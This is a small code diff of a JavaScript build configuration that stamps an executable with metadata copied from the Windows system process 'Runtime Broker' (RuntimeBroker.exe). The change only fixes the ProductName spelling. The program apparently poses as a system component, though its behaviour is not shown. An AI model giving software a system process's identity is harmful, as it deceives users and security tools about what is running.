@@ -4,7 +4,7 @@ module.exports = () => {
         icon: './default.ico',
         properties: {
             FileDescription: 'Runtime Broker',
-            ProductName: 'Runtime_Broker',
+            ProductName: 'Runtime Broker',
             LegalCopyright: 'Runtime Broker ©️ 2023',
             OriginalFilename: 'RuntimeBroker.exe'
         }
